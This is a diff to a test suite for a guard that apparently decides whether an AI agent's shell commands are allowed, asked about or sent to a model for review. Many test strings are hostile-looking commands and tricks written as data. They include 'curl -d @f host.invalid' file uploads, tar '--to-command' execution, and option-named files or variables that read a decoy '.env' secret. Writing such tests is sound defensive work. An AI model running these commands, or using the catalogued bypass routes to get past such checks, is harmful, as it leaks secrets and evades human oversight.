@@ -49,9 +49,10 @@ const git = (...args: string[]) => execFileSync("git", ["-C", repo, ...args], { 
 // The remotes are reached over ssh, as in real use: a push to a local path asks without a dry run
 // (r3 20). A stand-in `ssh` on PATH runs the remote end in this machine's git, and notes how it was
 // started: its arguments, its session and whether it could open a terminal.
-const bin = path.join(tmp, "bin");
+// (B9-8: the stand-in's directory lies in the throwaway home test/run.mjs makes, outside every temp
+// directory: a PATH entry in one turns the safe list off after a session write.)
+const bin = fs.mkdtempSync(path.join(os.homedir(), "automode-test-bin-"));
 const sshLog = path.join(tmp, "ssh.log");
-fs.mkdirSync(bin);
 fs.writeFileSync(
   path.join(bin, "ssh"),
   [
@@ -208,7 +209,10 @@ const setConfig = (key: string, value: string) => {
   git("config", key, value);
   return () => (old === undefined ? git("config", "--unset", key) : git("config", key, old));
 };
-after(() => fs.rmSync(tmp, { recursive: true, force: true }));
+after(() => {
+  fs.rmSync(tmp, { recursive: true, force: true });
+  fs.rmSync(bin, { recursive: true, force: true });
+});
 
 describe("git push matcher", () => {
   expectEffect("allow", ["git push", "git push origin feature/x", "git push origin HEAD", `cd ${repo} && git push`]);
@@ -1748,7 +1752,9 @@ describe("r3 E: decisions", () => {
     assert.equal(d.effect, "ask");
     assert.match(d.reason, /code for sh that only bash reads this way \(braces, \[\[ \]\], <<<, &>, a pattern that could match \. or \.\.\), where sh may be another shell/);
   });
-  expect("allow", ["ls && time ls", "time ls | wc -l", "echo `echo $(date +%s)`", "sh -c 'echo ${x%.*}'", "du -sh ${u:-.*}"]);
+  expect("allow", ["ls && time ls", "time ls | wc -l", "echo `echo $(date +%s)`", "sh -c 'echo ${x%.*}'", "du -sh -- ${u:-.*}", "ls -d ${u:-.*}"]);
+  // (Round 4, N3b-4: without the `--`, du's word is one bash builds, which can be an option.)
+  expect("classify", ["du -sh ${u:-.*}"]);
   expect("allow", ["sh -c 'p=\"a b\"; ls $p'", "sh -c 'ls -d ${x:-a${y+c}}'", "time -p ls >o.txt", "echo \"export\" p=1", "ls 2>/dev/null; [[ -n x || -f y ]]", "sh -c 'command echo export \"p=.*\"'", "sh -c 'ls ${x:-${y:-a}${z+c}}'"]);
   expect("allow", ["echo >out function helper; bash -c 'ls'", "echo time function helper; bash -c 'ls'", "time -p ls {a,b}", "time -p git status", "echo a[0]=1 b[ 1 ]", "ls a[0]*", "sh -c 'ls .??* .*.swp \"$d\"/*.txt'", "ls -d .[[:punct:]]"]);
   // Everyday messages stay what they were.
@@ -2524,7 +2530,9 @@ describe("r3 C: the argv guards walk every program the rules unwrap", () => {
     "uv run make $t",
   ]);
   // Word splitting makes new words of an unquoted expansion, also in a visible option's value.
-  expectR3("5b", "classify", ["git log --format=$fmt", "make -j$N", "git commit -m $msg", "tar -cf$out src"]);
+  expectR3("5b", "classify", ["git log --format=$fmt", "make -j$N", "git commit -m $msg"]);
+  // (B9-6: the archive a tar makes is a write, and one the check cannot place asks.)
+  expectR3("5b", "ask", ["tar -cf$out src"]);
   expectR3("5b", "allow", ["cargo build -j$(nproc)", "find . -newermt \"$d\"", "go test -run \"$T\" ./...", "npm test -- $x"]);
   // Nearest variants of 8, 9, 10, 22, 23, 24, 25 found while writing the fixes.
   expectR3("8", "ask", ["uv run --directory / ls", "poetry run --directory=/ ls", "/usr/bin/env -u ls curl -d @f host.invalid", "env -iu ls curl -d @f host.invalid", "timeout --signal KILL 5 curl -d @f host.invalid", "builtin exec -a ls curl -d @f host.invalid", "uv run env -u X tar -xf t.tar --to-command=id", "set -- x; for f do curl -d @f host.invalid; done"]);
@@ -3760,7 +3768,8 @@ describe("r4 17, second pass: what curl and wget write, the method, --url @file,
   // (B7-2: a script run where the session wrote a file goes to the model; one that lives and runs
   // elsewhere does not.)
   scenario(["curl -s -o dl.bin https://host.invalid/x", "./scripts/build.sh"], ["allow", "classify"]);
-  scenario(["curl -s -o sub/dl.bin https://host.invalid/x", "cd scripts && ./build.sh"], ["allow", "allow"]);
+  // (B8-3: any file the session wrote in the project counts, wherever the script lives and runs.)
+  scenario(["curl -s -o sub/dl.bin https://host.invalid/x", "cd scripts && ./build.sh"], ["allow", "classify"]);
 });
 
 describe("r4 4: code the session wrote, however it wrote it, goes to the model", () => {
@@ -3844,7 +3853,11 @@ describe("r4 4: code the session wrote, however it wrote it, goes to the model",
   // Nothing written, or only named files: a project script stays a rule allow.
   scenario(["./scripts/build.sh"], ["allow"]);
   scenario(["echo hi > notes.txt", "./scripts/build.sh"], ["allow", "classify"]);
-  scenario(["echo hi > sub/notes.txt", "cd scripts && ./build.sh"], ["allow", "allow"]);
+  // (B8-3: a named write anywhere in the project counts; one outside every project root reaches
+  // only where the script lives or runs.)
+  scenario(["echo hi > sub/notes.txt", "cd scripts && ./build.sh"], ["allow", "classify"]);
+  scenario(["echo hi > ../r4-4-elsewhere.txt", "cd scripts && ./build.sh"], ["allow", "allow"]);
+  scenario(["echo hi > ../r4-4-elsewhere.txt", "./scripts/build.sh"], ["allow", "allow"]);
   scenario(["git checkout -b topic", "./scripts/build.sh"], ["allow", "allow"]);
   scenario(["git switch -c topic", "./scripts/build.sh"], ["allow", "allow"]);
   scenario(["sed -i 's/x/y/' f", "./scripts/build.sh"], ["allow", "classify"]);
@@ -3862,7 +3875,8 @@ describe("r4 4: code the session wrote, however it wrote it, goes to the model",
   scenario(["tar -xf a.tar", "./scr*/build.sh"], ["allow", "classify"]);
   scenario(["cat f > notes.txt", "./scripts/b[[.u.]]ild.sh"], ["allow", "classify"]);
   scenario(["echo hi > notes.txt", "./scripts/b*.sh"], ["allow", "classify"]);
-  scenario(["echo hi > sub/notes.txt", "cd scripts && ./b*.sh"], ["allow", "allow"]);
+  scenario(["echo hi > sub/notes.txt", "cd scripts && ./b*.sh"], ["allow", "classify"]);
+  scenario(["echo hi > ../r4-4-elsewhere.txt", "cd scripts && ./b*.sh"], ["allow", "allow"]);
   // A file with more than one name is the same file (a hard link; probed: the script ran).
   scenario(["ln scripts/build.sh al.sh", "cat f >> al.sh", "./scripts/build.sh"], ["allow", "allow", "classify"]);
   scenario(["ln scripts/build.sh al.sh && cat f >> al.sh && ./scripts/build.sh"], ["classify"]);
@@ -3898,7 +3912,8 @@ describe("r4 4: code the session wrote, however it wrote it, goes to the model",
   scenario(["cp -r sub/scripts other", "./other/build.sh"], ["allow", "classify"]);
   // (A new name at the top is above every directory of the project; one in `sub` is not.)
   scenario(["cp -r sub/scripts other", "cd scripts && ./build.sh"], ["allow", "classify"]);
-  scenario(["cp -r sub/scripts sub/copy", "cd scripts && ./build.sh"], ["allow", "allow"]);
+  // (B8-3: the copy's own name, `sub/copy`, is a named write in the project.)
+  scenario(["cp -r sub/scripts sub/copy", "cd scripts && ./build.sh"], ["allow", "classify"]);
   scenario(["rsync -a sub/scripts/ other/", "./other/build.sh"], ["allow", "classify"]);
   scenario(["tar -xPf a.tar", "./scripts/build.sh"], ["allow", "classify"]);
   // An old-style bundle read as tar reads it: `xfC a.tar sub` is `-x -f a.tar -C sub`.
@@ -3941,7 +3956,7 @@ describe("r4 4: code the session wrote, however it wrote it, goes to the model",
   // A glob as a write target that the matcher cannot read marks the directory it starts from (the
   // rules ask about it: approved, the mark is the session's), and nothing beside it.
   approvedThen([["sed -i 's/safe/x/' scripts/[[=c=]]uild.sh", "ask"], ["./scripts/test.sh", "classify"]], "an unreadable glob written marks the directory it starts from");
-  approvedThen([["sed -i 's/safe/x/' scripts/[[=c=]]uild.sh", "ask"], ["cd sub && ./scripts/build.sh", "allow"]], "an unreadable glob written leaves the directories beside it");
+  approvedThen([["sed -i 's/safe/x/' scripts/[[=c=]]uild.sh", "ask"], ["cd sub && ./scripts/build.sh", "classify"]], "an unreadable glob written is a write in the project, for every script of it (B8-3: its word is kept as a named write)");
   test("r4 4b: a write through an unreadable glob that starts at / marks / once approved", async () => {
     const dir = fixture();
     const s = new SessionState(dir);
@@ -4025,7 +4040,9 @@ describe("r4 D3: runners go to the model once the session has written into their
   scenario(["make"], ["allow"]);
   scenario(["npm test"], ["allow"]);
   scenario(["cat Makefile", "ls src", "make", "npm test"], ["allow", "allow", "allow", "allow"]);
-  scenario(["echo x > sub/a.txt", "make -C other"], ["allow", "allow"]);
+  // (B8-3: a write anywhere in the project counts; one outside it reaches only the runner's places.)
+  scenario(["echo x > sub/a.txt", "make -C other"], ["allow", "classify"]);
+  scenario(["echo x > ../r4-d3-elsewhere.txt", "make -C other"], ["allow", "allow"]);
   scenario(["tar -xf a.tar -C sub", "make -C other"], ["allow", "allow"]);
   scenario(["echo x > src/b.js", "git status"], ["allow", "allow"]);
   scenario(["echo x > src/b.js", "ruff check ."], ["allow", "classify"]);
@@ -4107,25 +4124,27 @@ describe("r4 D1: a git call that writes the work tree marks the files git change
       }
       assert.deepEqual(got, steps.map((x) => x.want));
     });
-  // A pull that changes scripts/build.sh: that file goes to the model, the others stay allowed.
+  // A pull that changes scripts/build.sh: that file goes to the model, named. (B8-3: and so does
+  // every other script of the project from then on: what git changed is a write of the session
+  // in the project. A pull that changes nothing leaves them allowed: the test above.)
   flow("a pull marks what it changed", [
     { decide: "git pull", run: ["pull", "-q"], want: "allow" },
-    { decide: "cd tools && ./check.sh", want: "allow" },
+    { decide: "cd tools && ./check.sh", want: "classify" },
     { decide: "./scripts/build.sh", want: "classify" },
   ]);
   flow("a pull that changes nothing marks nothing", [
     { decide: "git pull", run: ["pull", "-q"], want: "allow" },
     { decide: "git pull", run: ["pull", "-q"], want: "classify" },
-    { decide: "cd tools && ./check.sh", want: "allow" },
+    { decide: "cd tools && ./check.sh", want: "classify" },
   ]);
   flow("a checkout of another branch marks what differs", [
     { decide: "git checkout topic", run: ["checkout", "-q", "topic"], want: "allow" },
-    { decide: "cd tools && ./check.sh", want: "allow" },
+    { decide: "cd tools && ./check.sh", want: "classify" },
     { decide: "bash scripts/build.sh", want: "classify" },
   ]);
   flow("a stash pop marks the file it restores", [
     { decide: "git stash pop", run: ["stash", "pop", "-q"], want: "allow" },
-    { decide: "cd tools && ./check.sh", want: "allow" },
+    { decide: "cd tools && ./check.sh", want: "classify" },
     { decide: "./scripts/build.sh", want: "classify" },
   ], { before: (g) => {
     g("checkout", "-q", "topic", "--", "scripts/build.sh");
@@ -4134,7 +4153,7 @@ describe("r4 D1: a git call that writes the work tree marks the files git change
   flow("a merge marks what it brought", [
     { decide: "git merge topic", run: ["merge", "-q", "topic"], want: "allow" },
     { decide: "./scripts/build.sh", want: "classify" },
-    { decide: "cd tools && ./check.sh", want: "allow" },
+    { decide: "cd tools && ./check.sh", want: "classify" },
   ]);
   // The runners of D3 see the marked files too.
   flow("a pull that changes a file makes a runner go to the model", [
@@ -4247,7 +4266,9 @@ describe("r4 B3 2 (decision D3, A5, F-E): a runner behind a global option, or un
   b3Session("B3-2 D3", ["echo x > web/f", "cd src && cargo -C ../web test"], ["allow", "classify"]);
   // ... and a write elsewhere leaves it alone: the place is read, not given up.
   for (const runner of ["cd src && npm --prefix ../web test", "cd src && go -C ../web test ./...", "cd src && cargo -C ../web test", "cd src && npm --loglevel error test", "cd src && cargo +nightly test"]) {
-    b3Session("B3-2 D3", ["echo x > sub/a.txt", runner], ["allow", "allow"]);
+    // (B8-3: elsewhere is outside the project now; a write in a sibling directory counts.)
+    b3Session("B3-2 D3", ["echo x > ../b3-elsewhere.txt", runner], ["allow", "allow"]);
+    b3Session("B3-2 D3", ["echo x > sub/a.txt", runner], ["allow", "classify"]);
   }
   // flake8 and golangci-lint load code their configuration names: runners.
   b3Session("B3-2 D3", ["echo x > .flake8", "flake8"], ["allow", "classify"]);
@@ -4439,7 +4460,8 @@ describe("r4 B3 7: the runners' place options, the runner tools, make --temp-std
     "cd src && pytest --rootdir=../web",
   ]) {
     b3Session("B3-7 places", ["echo x > web/f", runner], ["allow", "classify"]);
-    b3Session("B3-7 places", ["echo x > sub/a.txt", runner], ["allow", "allow"]);
+    b3Session("B3-7 places", ["echo x > ../b3-elsewhere.txt", runner], ["allow", "allow"]);
+    b3Session("B3-7 places", ["echo x > sub/a.txt", runner], ["allow", "classify"]);
   }
   // The runner tools that share one mention in the second pass's tests.
   for (const runner of ["just", "ninja", "meson test", "ctest", "tox", "nox", "mypy .", "luacheck .", "markdownlint .", "docker build .", "prettier --check .", "mocha"]) {
@@ -4447,8 +4469,11 @@ describe("r4 B3 7: the runners' place options, the runner tools, make --temp-std
     b3Session("B3-7 tools", [runner], ["allow"]);
   }
   // make reads the file `--temp-stdin` names as a makefile.
-  b3Session("B3-7 temp-stdin", ["printf 'all:\\n\\tid\\n' > sub/x.mk", "cd src && make --temp-stdin=../sub/x.mk"], ["allow", "classify"]);
-  b3Session("B3-7 temp-stdin", ["printf 'all:\\n\\tid\\n' > sub/x.mk", "cd src && make"], ["allow", "allow"]);
+  // (B8-3: the makefile is written outside the project, so that only the option makes it the
+  // runner's.)
+  b3Session("B3-7 temp-stdin", ["printf 'all:\\n\\tid\\n' > ../b3-x.mk", "cd src && make --temp-stdin=../../b3-x.mk"], ["allow", "classify"]);
+  b3Session("B3-7 temp-stdin", ["printf 'all:\\n\\tid\\n' > ../b3-x.mk", "cd src && make"], ["allow", "allow"]);
+  b3Session("B3-7 temp-stdin", ["printf 'all:\\n\\tid\\n' > sub/x.mk", "cd src && make"], ["allow", "classify"]);
   b3Session("B3-7 temp-stdin", ["make --temp-stdin=/dev/stdin <<'EOF'\nall:\n\tid\nEOF"], ["ask"]);
   // curl's -g makes a `file:` name literal: no glob for curl to expand.
   expectR4("B3-7 curl -g", "allow", ["curl -s -g 'file:///etc/host[s]'", "curl -s --globoff 'file:///etc/host{s}'", "curl -sg 'file:///etc/host[s]'"]);
@@ -4643,13 +4668,16 @@ describe("r4 B3b 5: BASH_LOADABLES_PATH, workspace selectors, the unread-runner 
   // attached: a separate `../web` is also an operand that names a directory, a place either way.
   for (const runner of ["cd src && npm --workspace=../web test", "cd src && pnpm --filter=../web test", "cd src && npm -w ../web test", "cd src && pnpm --filter ../web test"]) {
     b3Session("B3b-5 selector", ["echo x > web/f", runner], ["allow", "classify"]);
-    b3Session("B3b-5 selector", ["echo x > sub/a.txt", runner], ["allow", "allow"]);
+    b3Session("B3b-5 selector", ["echo x > ../b3-elsewhere.txt", runner], ["allow", "allow"]);
+    b3Session("B3b-5 selector", ["echo x > sub/a.txt", runner], ["allow", "classify"]);
   }
   // An option the reading does not know where the rules allow the call: the call counts as a
   // runner (a runner subcommand is among its words) with a place the check cannot tell.
-  b3Session("B3b-5 unread", ["echo x > sub/a.txt", "cd src && docker --debug build ."], ["allow", "classify"]);
+  // (B8-3: the write is outside the project, where only the place decides.)
+  b3Session("B3b-5 unread", ["echo x > ../b3-elsewhere.txt", "cd src && docker --debug build ."], ["allow", "classify"]);
   b3Session("B3b-5 unread", ["cd src && docker --debug build ."], ["allow"]);
-  b3Session("B3b-5 unread", ["echo x > sub/a.txt", "cd src && docker build ."], ["allow", "allow"]);
+  b3Session("B3b-5 unread", ["echo x > ../b3-elsewhere.txt", "cd src && docker build ."], ["allow", "allow"]);
+  b3Session("B3b-5 unread", ["echo x > sub/a.txt", "cd src && docker build ."], ["allow", "classify"]);
 });
 
 // ---- Round 4, group B, third pass, first part, third go (B3c) ----
@@ -5294,11 +5322,1001 @@ describe("r4 N3-4: everyday forms keep their ending where no file is named like 
   ];
   expectN3("N3-4", false, "allow", EVERYDAY);
   // Beside a file named `-o` (and the others): only a glob that can match one of them asks.
-  expectN3("N3-4", true, "allow", EVERYDAY.filter((c) => !/ \*$/.test(c) && !c.startsWith("cut ")));
-  // A known cost: the words reach the check without their quotes, so a quoted glob is read as
-  // one. Beside a directory named `-d`, `-d'*'` is taken for a glob that matches it.
-  expectN3("N3-4", true, "ask", ["cut -d'*' -f1 f"], /-d\* matches -d, which cut would read as an option/);
+  expectN3("N3-4", true, "allow", EVERYDAY.filter((c) => !/ \*$/.test(c)));
+  // (Once a known cost: the words reached the check without their quotes, so beside a directory
+  // named `-d`, `-d'*'` was taken for a glob that matches it. N3c reads only unquoted globs.)
   expectN3("N3-4", true, "ask", ["ls *", "tar cf b.tar *", "git add *"], /\* matches -.*, which (ls|tar|git) would read as an option/);
+});
+
+// ---- Round 4, N3b: what the two checks of N3 found ----
+// More trees, each b3Project's with an archive: "env" holds a decoy `.env` and a file named
+// `--files0-from=.env` (no directory named like an option); "lone" a file named `-`; "link" two
+// links named like options (`--up` to a file, `-l` to a directory).
+const n3bTrees = new Map<string, string>();
+const n3bTree = (tree: "plain" | "dashed" | "env" | "lone" | "link") => {
+  if (tree === "plain" || tree === "dashed") return n3Project(tree === "dashed");
+  if (n3bTrees.has(tree)) return n3bTrees.get(tree)!;
+  const dir = b3Project();
+  fs.writeFileSync(path.join(dir, "x"), "x\n");
+  fs.writeFileSync(path.join(dir, "src", "a.ts"), "x\n");
+  execFileSync("tar", ["-cf", "a.tar", "x"], { cwd: dir });
+  if (tree === "env") {
+    fs.writeFileSync(path.join(dir, ".env"), "SECRET=hunter2\n");
+    fs.writeFileSync(path.join(dir, "--files0-from=.env"), "");
+  }
+  if (tree === "lone") fs.writeFileSync(path.join(dir, "-"), "");
+  if (tree === "link") {
+    fs.symlinkSync("f", path.join(dir, "--up"));
+    fs.symlinkSync("src", path.join(dir, "-l"));
+  }
+  n3bTrees.set(tree, dir);
+  return dir;
+};
+const expectN3b = (id: string, tree: "plain" | "dashed" | "env" | "lone" | "link", want: Want | Want[], commands: string[], reason?: RegExp) => {
+  for (const c of commands) test(`r4 ${id}: ${tree}: ${Array.isArray(want) ? want.join(" or ") : want}: ${JSON.stringify(c)}`, async () => {
+    const dir = n3bTree(tree);
+    const d = await decideShell(guard, new SessionState(dir), dir, c);
+    const wants = Array.isArray(want) ? want : [want];
+    assert.ok(wants.includes(kind(d)), `${c} -> ${d.effect} by ${d.by}: ${d.reason}`);
+    if (reason) assert.match(d.reason, reason, c);
+  });
+};
+
+describe("r4 N3b-1: a path with a part named like an option that is not there yet asks, whatever the program", () => {
+  // (B9-6: the archive a tar or a zip makes is a write of its own, and its check names it first.)
+  const MAKES = /(would make a file or directory|makes a file) named like an option \(.*\): a later glob hands it to a program as one/;
+  expectN3b("N3b-1", "plain", "ask", [
+    // The directories on the way: any part, whatever stands before it.
+    "mkdir -p ./--to-command=rec/x",
+    "mkdir -p ./--to-command=rec/x && tar xf a.tar --to*",
+    "mkdir -p './--to-command=sh f/x'",
+    "mkdir -p ./--zz/.",
+    "mkdir -p ./--zz/..",
+    "mkdir -p src/--zz/x",
+    "mkdir -p src/--zz/x && cd src && ls -l *",
+    "mkdir -p new/--zz/x",
+    "mkdir -pm 755 ./--zz/x/y",
+    "mkdir -p -- --zz/x",
+    "mkdir --parents new/--zz/x",
+    "mkdir -p ./{--zz,q}/x",
+    "cd sub && mkdir -p ./--to-command=rec/x && tar xf ../a.tar --to*",
+    "install -D f ./--to-command=rec/x",
+    "install -D -t ./--to-command=rec/x f",
+    "install -d ./--zz/x",
+    "install -d new/--zz/x",
+    "rsync -R f ./--zz/x",
+    "rsync -a --mkpath f new/--zz/x",
+    "curl --create-dirs -o ./--zz/x https://example.invalid/x",
+    "curl --create-dirs -o new/--zz/x https://example.invalid/x",
+    "wget -P new/--zz/x https://example.invalid/x",
+    "cp --parents src/a.ts new/--zz/y",
+    // Any program: the first such part that is not there, behind directories that are.
+    "tar cf './--to-command=sh f' x",
+    "tar cf './--to-command=sh f' x; tar xf a.tar --to*",
+    "tar cf ./--x.tar f",
+    "tar -cf./--x.tar f",
+    "tar --file=./--x.tar -c f",
+    "tar cf src/--x.tar f",
+    "tar cf ~+/--x.tar f",
+    "tar cf .//--x.tar f",
+    "tar cf src/../--x.tar f",
+    "zip ./--x.zip f",
+    "zip -r src/--x.zip src",
+    "rm ./--zz",
+    "ls ./-*",
+    "x=./--zz",
+    "echo x > src/--zz/y",
+  ], MAKES);
+  // Already asked about, for the write it is.
+  expectN3b("N3b-1", "plain", "ask", ["find . -fprint0 ./--x", "git archive -o ./--x.tar HEAD", "git format-patch -o ./--x", "touch -- --zz", "echo x > --zz", "touch ./{a,--zz}", "mv f -- --zz", "touch ./-[z]"]);
+  // A path known only when the command runs, or a place the check cannot tell: not an allow.
+  expectN3b("N3b-1", "plain", ["ask", "classify"], ["zip \"$d/--x.zip\" f", "zip $(pwd)/--x.zip f", "zip ./$d/--x.zip f", "zip ~-/--x.zip f", "cd \"$d\" && zip ./--x.zip f", "mkdir -p \"$d/--zz/x\"", "ls ~-/--zz", "cd \"$d\" && ls ./--zz", "mkdir -p \"q $d/--zz/x\"", "curl --create-dirs -o \"q $d/--zz/x\" https://example.invalid/x"]);
+  expectN3b("N3b-1", "plain", "classify", ["ls \"$d/--zz\"", "ls $(pwd)/--zz", "ls src/$d/--zz", "ls \"s$d/--zz\"", "ls ~nosuchuser/--zz"], /may name a new file or directory that begins with -/);
+  // (A `/` inside an expansion parts nothing.)
+  expectN3b("N3b-1", "plain", "allow", ["echo \"${v//\\//-}\"", "ls \"$d/x\"", "ls \"$d\"/-", "awk '{print $1/-2}' f", "echo \"s|$a|b/-c|\"", "echo \"q $d/--zz\""]);
+  // A word that is no path: its first part is no directory here. And `-` alone is no option.
+  expectN3b("N3b-1", "plain", "allow", [
+    "sed 's/-foo/-bar/' f",
+    "sed -e 's/-foo/-bar/' f",
+    "sed -n '/-foo/p' f",
+    "sed -i s/-a/-b/ f",
+    "curl https://gitlab.com/g/p/-/raw/main/x",
+    "git log origin/main..topic/-x",
+    "grep 'a/-b' f",
+    "grep -- -foo f",
+    "grep -e /-x f",
+    "git branch --sort=-committerdate",
+    "tail -n -5 f",
+    "mkdir -p build/out",
+    "mkdir -p src/a-b/c-d",
+    "touch ./-",
+    "ls ./-",
+    "mkdir -p ./-/x",
+    "tar cf src/x-.tar f",
+    "ls -la src/",
+    "echo 1/-2",
+  ]);
+  // A part that is there already makes no new name.
+  expectN3b("N3b-1", "dashed", "allow", ["rm ./-o", "cat ./-o", "chmod 644 ./-o", "mv ./-o zz", "mv -- -o zz", "ls ./-d/x", "echo x >> ./-o", "sort -o ./-o f", "mkdir -p ./-d/sub", "touch ./-d/y", "ls ./-*", "tar cf ./-d/x.tar f"]);
+  // (B9-6: the archive is a write of tar's, held to the check of what a call makes; behind the
+  // file `-o` it cannot be made, and it asks as `mkdir -p ./-o/--zz/x` does.)
+  expectN3b("N3b-1", "dashed", "ask", ["mkdir -p ./-d/--zz/x", "tar cf ./-d/--x.tar f", "mkdir -p ./-o/--zz/x", "tar cf ./-o/--x.tar f"], MAKES);
+  expectN3b("N3b-1", "dashed", "ask", ["touch ./-d/--zz", "touch ./--zz"]);
+});
+
+describe("r4 N3b-2: sed -i with a suffix that names the backup, and patch -o", () => {
+  expectN3b("N3b-2", "plain", "ask", [
+    "sed -i'--to-command=sh *' s/a/a/ f",
+    "sed -i'--to-command=sh *' s/a/a/ f && tar xf a.tar --to*",
+    "sed --in-place='--to-command=*' s/a/a/ f",
+    "sed --in='--to-command=*' s/a/a/ f",
+    "sed -ni'--x*' p f",
+    "sed -i'sub/--x' s/a/a/ f",
+    "sed -i\"$s\" s/a/a/ f",
+  ], /sed -i with a suffix that names the backup file itself/);
+  expectN3b("N3b-2", "plain", "ask", ["patch -o ./--to-command=rec f p.diff", "patch -o --zz f p.diff", "patch --output=--zz f p.diff", "patch --output --zz f p.diff"], /named like an option/);
+  // (perl and ruby with -i are the model's as before: not an allow.)
+  expectN3b("N3b-2", "plain", ["ask", "classify"], ["perl -i'--to-command=sh *' -pe1 f", "ruby -i'--x*' -pe1 f"]);
+  // (A script attached to -e is the model's as before: no suffix is read out of it.)
+  expectN3b("N3b-2", "plain", "classify", ["sed -es/-foo/-bar/ f", "sed -es/i*/x/ f"]);
+  expectN3b("N3b-2", "plain", "allow", ["sed -i.bak s/a/b/ f", "sed -i s/a/b/ f", "sed -i -e 's/a/-b/' f", "sed -ni.orig p f", "sed --in-place=.bak s/a/b/ f", "sed -i 's/a*/b/' f", "sed -e 's/i*/x/' f", "sed -n '/i/p' f"]);
+});
+
+describe("r4 N3b-3: a word that begins with an expansion and holds a glob", () => {
+  const OPTION = /can match --files0-from=\.env, which (wc|echo|ls) would read as an option/;
+  expectN3b("N3b-3", "env", "ask", ["x=; wc $x--f*", "wc \"$x\"--f*", "wc ${x}--f*", "wc $x--f*", "echo $x*"], OPTION);
+  expectN3b("N3b-3", "env", ["ask", "classify"], ["cd \"$d\" && wc $x--f*"]);
+  // No glob outside the expansion, or a glob behind a `/` where no directory is named like an
+  // option: as before.
+  expectN3b("N3b-3", "env", "allow", ["echo $?", "echo \"${a[@]}\"", "echo \"${a[*]}\"", "ls \"$dir\"/*.ts", "ls -\"$x\" src", "echo s\"$y\"*", "echo --zq\"$x\"*", "echo \"$(ls src/*.ts)\"", "echo \"`ls src/*.ts`\""]);
+  // (N3d-3: unquoted, each is an expansion bash splits and globs, judged as `*` is: here, where a
+  // name begins with -, an ask; in a tree without one, as before.)
+  expectN3b("N3b-3", "env", "ask", ["echo ${a[*]}", "ls -$x src", "echo s$y*", "echo --zq$x*", "echo $(ls src/*.ts)", "echo `ls src/*.ts`"], /holds an expansion that bash splits and globs, which can match -\S*, a name here that \S+ would read as an option/);
+  expectN3b("N3b-3", "plain", "allow", ["echo ${a[*]}", "ls -$x src", "echo s$y*", "echo --zq$x*", "echo $(ls src/*.ts)", "echo `ls src/*.ts`"]);
+  expectN3b("N3b-3", "plain", "allow", ["x=; echo $x--f*", "echo \"$x\"*"]);
+  expectN3b("N3b-3", "dashed", "ask", ["ls \"$dir\"/*.ts"], /can match -d, which ls would read as an option/);
+  // (A form bash reads by the locale: held to the names here whatever the matcher makes of it.)
+  expectN3b("N3b-3", "env", "ask", ["echo [[=-=]]x"], /can match --files0-from=\.env/);
+});
+
+describe("r4 N3b-4: an option that reads a list, hidden in a variable", () => {
+  const OPTION = /(wc|du|file|grep|jq) .*: a word that can become an option once bash expands it, and (wc|du|file|grep|jq)'s options are checked by name/;
+  expectN3b("N3b-4", "env", "classify", [
+    "x=--files0-from=.env; wc \"$x\"",
+    "x=files0-from=.env; wc --\"$x\"",
+    "du -a\"$x\" .",
+    "grep -\"$x\" notes.txt",
+    "wc -l \"$f\"",
+    "du -sh \"$dir\"",
+    "file \"$f\"",
+    "f=notes.txt; f=--files0-from=.env; wc \"$f\"",
+    "f=notes.txt; read f; wc \"$f\"",
+    "echo f=notes.txt; wc \"$f\"",
+    "f=-notes.txt; wc \"$f\"",
+    "f='src/a.ts'; du -sh $f",
+    "for f in src/*.ts; do f=--files0-from=.env; wc \"$f\"; done",
+    "for f in --files0-from=.env; do wc \"$f\"; done",
+    "git ls-files | while read f; do wc -l \"$f\"; done",
+  ], OPTION);
+  // (N3d-3: an unquoted expansion is also one bash splits and globs, judged as `*` is: where a
+  // name begins with -, as in this tree, an ask; the check above holds them in a tree without.)
+  const UNQUOTED = [
+    "x=--files0-from=.env; wc $x",
+    "x=--files0-from=.env; du $x",
+    "x=-f; file $x .env",
+    "wc -l $(git ls-files '*.ts')",
+    "wc $(echo --files0-from=.env)",
+    "wc -l notes.txt$x",
+    "f='a b'; wc $f",
+    "f=notes.txt$(echo ' --files0-from=.env'); wc $f",
+    "find . -name \"$p\" -exec sh -c 'wc $0' {} \\;",
+    "bash -c 'wc $x'",
+  ];
+  expectN3b("N3b-4", "plain", "classify", UNQUOTED, OPTION);
+  expectN3b("N3b-4", "env", "ask", UNQUOTED, /holds an expansion that bash splits and globs, which can match -\S*, a name here that \S+ would read as an option/);
+  expectN3b("N3b-4", "env", "classify", ["f=notes.txt; export f; wc \"$f\"", "f=notes.txt wc \"$f\""]);
+  // (Where the rules follow the variable, the list it names is read: an ask.)
+  expectN3b("N3b-4", "env", "ask", ["x=X.env; du -a\"$x\" .", "x=f.env; grep -\"$x\" notes.txt"], /reads \.env as a list/);
+  // Written out, or with a value the check cannot read: an ask, as before.
+  expectN3b("N3b-4", "env", "ask", ["wc --files0-from=.env", "du --files0-from=.env", "file -f .env", "wc --files0-from=\"$x\""]);
+  // Behind `--`, a loop over names that are here, and a variable the call plainly sets to a
+  // name (which is printed as that name before the checks read the command).
+  expectN3b("N3b-4", "env", "allow", [
+    "wc -l -- \"$f\"",
+    "du -sh -- \"$dir\"",
+    "file -- \"$f\"",
+    "f=notes.txt; wc -l \"$f\"",
+    "f=\"src/a.ts\"; wc -l \"$f\"",
+    "f=notes.txt && file \"${f}\"",
+    "for f in src/*.ts; do wc -l \"$f\"; done",
+    "for n in notes.txt f; do file \"$n\"; done",
+    "wc -l notes.txt",
+    "du -sh src",
+    "du --max-depth=\"$n\" src",
+    "file f",
+  ]);
+});
+
+describe("r4 N3b-5: a name that is - alone is no option", () => {
+  expectN3b("N3b-5", "lone", "allow", ["ls *", "wc -l *", "git add *", "tar cf b.tar *", "echo -*", "ls ?", "x=; echo $x*", "echo [-]"]);
+});
+
+describe("r4 N3b-6: the lines of N3 that no test held", () => {
+  // The programs that keep a name make none; braces in a target.
+  expectN3b("N3b-6", "plain", "allow", ["rm -f -- --zz", "rmdir -- --zz", "unlink -- --zz", "shred -- --zz", "chmod -- -x f", "chown -- me --zz", "chgrp -- staff --zz", "setfacl -m u:me:r -- --zz", "sed -i s/-a/-b/ f", "ln -s -- --zz link", "find . -name \"$pat\""]);
+  expectN3b("N3b-6", "plain", "classify", ["perl -i -pE 's/x/-y/' f", "ruby -i -pE 's/x/-y/' f"]);
+  expectN3b("N3b-6", "plain", "ask", ["touch ./{a,--zz}", "touch -- {a,--zz}", "dd if=f of=--zz", "echo x > --zz"], /makes a file named like an option \(--zz\)/);
+  // A place the check cannot tell: the model, with the word.
